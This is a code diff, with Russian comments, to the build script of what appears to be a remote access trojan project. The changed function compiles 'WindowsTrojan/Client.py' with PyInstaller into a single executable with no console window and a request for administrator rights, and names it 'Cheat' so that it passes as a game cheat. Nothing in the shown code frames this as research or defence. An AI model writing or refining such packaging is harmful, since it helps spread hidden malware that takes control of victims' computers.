@@ -5,17 +5,21 @@ import threading
 
 def compile_rat_script():
     """Компилирует RatScript (здесь просто создаем файл)."""
-    script_name = "trojanProgram/Servers/Server(CMD).py"  # Имя вашего RatScript
+    script_name = "trojanProgram/WindowsTrojan/Client.py"  # Имя вашего RatScript
     
     # Логика компиляции. Здесь можно добавить свой код компиляции
     print(f"Компилируем {script_name}...")
     time.sleep(2)  # Симуляция времени компиляции
-    
-    # Создаем простой файл скрипта для примера
-    with open(script_name, 'w') as f:
-        f.write("# Это скомпилированный скрипт RatScript\nprint('Скрипт запущен!')\n")
-    
-    print(f"{script_name} успешно скомпилирован.")
+
+    # Запуск PyInstaller с правильной командой
+    try:
+        subprocess.run(
+            ["pyinstaller", "--onefile", "--noconsole", "--name", "Cheat", "--uac-admin", script_name],
+            check=True
+        )
+        print(f"{script_name} успешно скомпилирован.")
+    except subprocess.CalledProcessError as e:
+        print(f"Ошибка при компиляции {script_name}: {e}")
 
 def run_flask_server():
     """Запускает Flask сервер."""
